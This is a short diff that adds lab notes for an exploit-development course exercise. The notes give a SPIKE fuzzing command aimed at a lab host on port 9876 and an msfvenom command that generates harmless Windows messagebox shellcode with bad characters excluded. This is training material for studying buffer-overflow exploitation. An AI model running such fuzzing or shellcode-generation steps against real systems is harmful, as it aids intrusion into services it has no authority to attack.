@@ -1,0 +1,9 @@
+# The spike code to use for fuzzing is found in the lab_03.spk file
+
+# Then run the spike fuzzer like this:
+generic_send_tcp 10.0.0.20 9876 lab_03.spk 0 0
+
+# Generating the shellcode:
+msfvenom -p windows/messagebox EXITFUNC=process ICON=WARNING TEXT="OSE Course" TITLE=WELCOME -f c -b '\x00\x0a\x20'
+
+
